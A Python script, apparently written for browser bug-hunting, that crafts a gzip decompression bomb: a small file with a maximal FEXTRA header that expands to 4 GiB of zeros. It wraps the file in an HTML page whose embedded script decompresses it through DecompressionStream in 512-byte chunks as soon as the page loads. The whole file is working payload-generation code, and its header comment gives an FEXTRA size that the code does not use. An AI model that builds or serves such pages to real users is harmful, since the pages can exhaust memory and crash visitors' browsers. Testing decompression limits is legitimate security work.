#!/usr/bin/env python3
# craft_fextra_img.py -- gzip with large FEXTRA (37434) AND a 4GiB image payload
# (the IDAT zeros) as the deflate body. Self-contained inflate HTML, 512B chunks.
import struct, zlib, base64, os, time

OUT = "/home/box/.hermes/profiles/seraphine/cache/scratch/websrv"
os.makedirs(OUT, exist_ok=True)

XLEN = 65535
EXTRA = b"\x00" * XLEN
PAYLOAD = 4 * 1024**3          # 4 GiB of zeros (the "large idat img")
Z = b"\x00" * (1024 * 1024)

t0 = time.time()
co = zlib.compressobj(6, zlib.DEFLATED, -15)   # raw deflate
body = bytearray(); fed = 0; crc = 0
while fed < PAYLOAD:
    n = min(len(Z), PAYLOAD - fed)
    chunk = Z[:n]
    body += co.compress(chunk)
    crc = zlib.crc32(chunk, crc)
    fed += n
body += co.flush()
print(f"payload {PAYLOAD} zeros -> deflate {len(body)}B, crc32=0x{crc&0xffffffff:x}  ({time.time()-t0:.1f}s)")

hdr = b"\x1f\x8b" + bytes([8, 0x04]) + struct.pack("<I", 0) + bytes([0, 255]) + struct.pack("<H", XLEN) + EXTRA
gz = hdr + bytes(body) + struct.pack("<II", crc & 0xffffffff, PAYLOAD & 0xffffffff)
open(os.path.join(OUT, "fextra_img.gz"), "wb").write(gz)
print(f"fextra_img.gz: {len(gz)} bytes")

b64 = base64.b64encode(gz).decode()
html = f"""<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1">
<title>fextra+4GiB-img chunked inflate</title>
<style>body{{font:15px system-ui;margin:2rem}}pre{{white-space:pre-wrap;background:#eee;padding:1rem}}.ok{{color:#176b2c}}.bad{{color:#9b1c1c}}</style>
<h3>fextra + 4GiB image payload — chunked inflate</h3><pre id="out">ready</pre>
<script>
const B64 = "{b64}";
const out = document.querySelector('#out');
const log = (...x) => {{ out.textContent += '\\n' + x.join(' '); }};
function b64ToBytes(b) {{ const s = atob(b); const a = new Uint8Array(s.length); for (let i=0;i<s.length;i++) a[i]=s.charCodeAt(i); return a; }}
async function run() {{
  out.textContent = 'starting…';
  try {{
    if (!('DecompressionStream' in self)) throw new Error('DecompressionStream unavailable');
    const bytes = b64ToBytes(B64);
    log('gzip bytes:', bytes.length);
    const CHUNK = 512;
    const stream = new ReadableStream({{
      start(c) {{ for (let i=0;i<bytes.length;i+=CHUNK) c.enqueue(bytes.slice(i, i+CHUNK)); c.close(); }}
    }}).pipeThrough(new DecompressionStream('gzip'));
    const reader = stream.getReader();
    let chunks=0, n=0;
    for (;;) {{ const x = await reader.read(); if (x.done) break; chunks++; n += x.value.byteLength; if (chunks%200===0) log('chunk', chunks, 'total', n); }}
    out.className='ok'; log('DONE: decompressed', n, 'bytes in', chunks, 'chunks');
  }} catch (e) {{ out.className='bad'; log('ERROR:', e && e.stack ? e.stack : e); }}
}}
run();
</script>"""
open(os.path.join(OUT, "fextra_img_inflate.html"), "w").write(html)
print(f"fextra_img_inflate.html: {len(html)} bytes (self-contained)")
